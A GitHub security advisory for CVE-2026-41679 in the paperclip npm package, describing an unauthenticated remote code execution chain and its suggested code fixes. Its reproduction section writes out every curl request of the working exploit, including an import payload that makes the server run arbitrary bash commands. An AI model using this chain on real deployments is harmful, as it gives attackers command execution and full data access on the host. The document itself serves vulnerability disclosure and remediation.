# [C] paperclip Vulnerable to Unauthenticated Remote Code Execution via Import Authorization Bypass

## Summary
Severity: Critical
Advisory: GHSA-68qg-g8mg-6pr7
CVE: CVE-2026-41679
CWE: CWE-1188, CWE-287, CWE-862
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-10
Source: https://github.com/advisories/GHSA-68qg-g8mg-6pr7
Type: github-advisory

## Affected
- npm: `paperclipai` — affected >=0 <2026.410.0
- npm: `@paperclipai/server` — affected >=0 <2026.410.0

## Details
## Summary

An unauthenticated attacker can achieve full remote code execution on any network-accessible Paperclip instance running in `authenticated` mode with default configuration. No user interaction, no credentials, just the target's address. The entire chain is six API calls.

I verified every step against the latest version. I have a fully automated PoC script and a video recording available.

Discord: sagi03581

## Steps to Reproduce

The attack chains four independent flaws to escalate from zero access to RCE:

### Step 1: Create an account (no invite, no email verification)

```bash
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com","password":"P@ssw0rd123","name":"attacker"}' \
  http://<target>:3100/api/auth/sign-up/email
```

Returns a valid account immediately. No invite token required, no email verification.

This works because `PAPERCLIP_AUTH_DISABLE_SIGN_UP` defaults to `false` in `server/src/config.ts:169-173`:

```typescript
const authDisableSignUp: boolean =
  disableSignUpFromEnv !== undefined
    ? disableSignUpFromEnv === "true"
    : (fileConfig?.auth?.disableSignUp ?? false);   // default: open
```

And email verification is hardcoded off in `server/src/auth/better-auth.ts:89-93`:

```typescript
emailAndPassword: {
  enabled: true,
  requireEmailVerification: false,
  disableSignUp: config.authDisableSignUp,
},
```

The environment variable isn't documented in the deployment guide, so operators don't know it exists.

### Step 2: Sign in

```bash
curl -s -v -X POST -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com","password":"P@ssw0rd123"}' \
  http://<target>:3100/api/auth/sign-in/email
```

Capture the session cookie from the `Set-Cookie` header.

### Step 3: Create a CLI auth challenge and self-approve it

Create the challenge (no authentication required at all):

```bash
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"command":"test"}' \
  http://<target>:3100/api/cli-auth/challenges
```

The response includes a `token` and a `boardApiToken`. The handler at `server/src/routes/access.ts:1638-1659` has no actor check -- anyone can create a challenge.

Now approve it with our own session:

```bash
curl -s -X POST \
  -H "Cookie: <session-cookie>" \
  -H "Content-Type: application/json" \
  -H "Origin: http://<target>:3100" \
  -d '{"token":"<token-from-above>"}' \
  http://<target>:3100/api/cli-auth/challenges/<id>/approve
```

The approval handler at `server/src/routes/access.ts:1687-1704` checks that the caller is a board user but does not check whether the approver is the same person who created the challenge:

```typescript
if (req.actor.type !== "board" || (!req.actor.userId && !isLocalImplicit(req))) {
  throw unauthorized("Sign in before approving CLI access");
}
// no check that approver !== creator
const userId = req.actor.userId ?? "local-board";
const approved = await boardAuth.approveCliAuthChallenge(id, req.body.token, userId);
```

The `boardApiToken` from step 3 is now a persistent API key tied to our account.

### Step 4: Create a company and deploy an agent via import (authorization bypass)

This is the critical flaw. The direct company creation endpoint correctly requires instance admin:

`server/src/routes/companies.ts:260-264`:
```typescript
router.post("/", validate(createCompanySchema), async (req, res) => {
  assertBoard(req);
  if (!(req.actor.source === "local_implicit" || req.actor.isInstanceAdmin)) {
    throw forbidden("Instance admin required");
  }
});
```

But the import endpoint does not:

`server/src/routes/companies.ts:170-176`:
```typescript
router.post("/import", validate(companyPortabilityImportSchema), async (req, res) => {
  assertBoard(req);                                     // only checks board type
  if (req.body.target.mode === "existing_company") {
    assertCompanyAccess(req, req.body.target.companyId);  // only for existing
  }
  // NO assertInstanceAdmin for "new_company" mode
  const result = await portability.importBundle(req.body, ...);
});
```

`assertInstanceAdmin` isn't even imported in `companies.ts` (line 27 only imports `assertBoard`, `assertCompanyAccess`, `getActorInfo`), while it is imported and used in other route files like `agents.ts`.

The import also accepts a `.paperclip.yaml` in the bundle that specifies agent adapter configuration. The `process` adapter takes a `command` and `args` and calls `spawn()` directly with zero sandboxing. The import service passes the full `adapterConfig` through without validation (`server/src/services/company-portability.ts:3955-3981`).

```bash
curl -s -X POST -H "Authorization: Bearer <board-api-key>" \
  -H "Content-Type: application/json" \
  -H "Origin: http://<target>:3100" \
  -d '{
    "source": {"type": "inline", "files": {
      "COMPANY.md": "---\nname: attacker-corp\nslug: attacker-corp\n---\nx",
      "agents/pwn/AGENTS.md": "---\nkind: agent\nname: pwn\nslug: pwn\nrole: engineer\n---\nx",
      ".paperclip.yaml": "agents:\n  pwn:\n    icon: terminal\n    adapter:\n      type: process\n      config:\n        command: bash\n        args:\n          - -c\n          - id > /tmp/pwned.txt && whoami >> /tmp/pwned.txt"
    }},
    "target": {"mode": "new_company", "newCompanyName": "attacker-corp"},
    "include": {"company": true, "agents": true},
    "agents": "all"
  }' \
  http://<target>:3100/api/companies/import
```

Returns the new company ID and agent ID. The attacker now owns a company with a process adapter agent configured to run arbitrary commands.

### Step 5: Trigger the agent

```bash
curl -s -X POST -H "Authorization: Bearer <board-api-key>" \
  -H "Content-Type: application/json" \
  -H "Origin: http://<target>:3100" \
  -d '{}' \
  http://<target>:3100/api/agents/<agent-id>/wakeup
```

The wakeup handler at `server/src/routes/agents.ts:2073-2085` only checks `assertCompanyAccess`, which passes because the attacker created the company. Paperclip spawns `bash -c "id > /tmp/pwned.txt && ..."` as the server's OS user.

### Proof of Concept

I have a self-contained bash script that runs the full chain automatically:

```
./poc_exploit.sh http://<target>:3100
```

It creates a random test account, self-approves a CLI key, imports a company with a process adapter agent, triggers it, and checks for a marker file to confirm execution. Runs in under 30 seconds.

## Impact

An unauthenticated remote attacker can execute arbitrary commands as the Paperclip server's OS user on any `authenticated` mode deployment with default configuration. This gives them:

- Full filesystem access (read/write as the server user)
- Access to all data in the Paperclip database
- Ability to pivot to internal network services
- Ability to disrupt all agent operations

The attack is fully automated, requires no user interaction, and works against the default deployment configuration.

## Suggested Fixes

### Critical: Unauthorized board access (the root cause)

The import bypass is how I got RCE today, but the real problem is that anyone can go from unauthenticated to a fully persistent board user through open signup + self-approve. Even if you fix the import endpoint, the attacker still has a board API key and can:

- Read adapter configurations and internal API structure
- Approve/reject/request-revision on any company's approvals (these endpoints only check `assertBoard`, not `assertCompanyAccess`)
- Cancel any company's agent runs (same missing check)
- Read issue data from any heartbeat run (zero auth on `GET /api/heartbeat-runs/:runId/issues`)
- Create unlimited accounts for resource exhaustion
- Wait for the next authorization bug to appear

**These need to be fixed together:**

1. **Disable open registration by default** -- `server/src/config.ts:172`, change `?? false` to `?? true`. Document `PAPERCLIP_AUTH_DISABLE_SIGN_UP` in the deployment guide. Any deployment that wants open signup can opt in explicitly.

2. **Prevent CLI auth self-approval** -- `server/src/routes/access.ts`, around line 1700. Reject when the approving user is the same user who created the challenge. Right now anyone with a session can generate their own persistent API key.

3. **Require email verification** -- `server/src/auth/better-auth.ts:91`, set `requireEmailVerification: true`. At minimum this stops throwaway accounts.

### Critical: Import authorization bypass (the RCE path)

4. **Add `assertInstanceAdmin` to the import endpoint for `new_company` mode** -- `server/src/routes/companies.ts`, lines 161-176. The direct `POST /` creation endpoint already has this check. The import endpoint doesn't. Apply the same check to both `POST /import` and `POST /import/preview`:

```typescript
assertBoard(req);
if (req.body.target.mode === "new_company") {
  if (!(req.actor.source === "local_implicit" || req.actor.isInstanceAdmin)) {
    throw forbidden("Instance admin required");
  }
} else {
  assertCompanyAccess(req, req.body.target.companyId);
}
```

## References
- https://github.com/paperclipai/paperclip/security/advisories/GHSA-68qg-g8mg-6pr7
- https://nvd.nist.gov/vuln/detail/CVE-2026-41679
- https://github.com/paperclipai/paperclip
